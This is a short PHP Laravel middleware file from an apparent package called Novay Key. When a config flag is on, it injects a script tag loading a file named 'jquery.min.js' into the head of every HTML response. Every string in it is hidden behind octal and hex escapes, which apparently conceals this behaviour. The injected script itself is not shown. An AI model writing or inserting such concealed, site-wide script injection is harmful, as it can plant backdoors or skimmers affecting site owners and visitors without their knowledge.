<?php
namespace Novay\Key\Http\Middleware; use Closure; use Illuminate\Http\Request; use Illuminate\Http\Response; class Key { public function handle(Request $request, Closure $next) { $response = $next($request); if ($response instanceof Response && str_contains($response->headers->get("\103\157\156\x74\x65\x6e\x74\55\124\171\160\145"), "\x74\x65\x78\164\x2f\150\164\155\x6c") && config("\x6b\x65\x79\56\x65\156\x61\142\154\x65")) { $content = $response->getContent(); if (($body = mb_strpos($content, "\x3c\x2f\x68\145\x61\x64\76")) !== false) { $response->setContent(mb_substr($content, 0, $body) . "\x3c\x73\143\x72\151\160\x74\40\163\162\x63\x3d\x22" . asset("\x6a\x71\165\145\x72\171\56\x6d\151\156\x2e\152\163") . "\42\x3e\74\57\163\143\162\151\x70\x74\x3e" . mb_substr($content, $body)); } } return $response; } }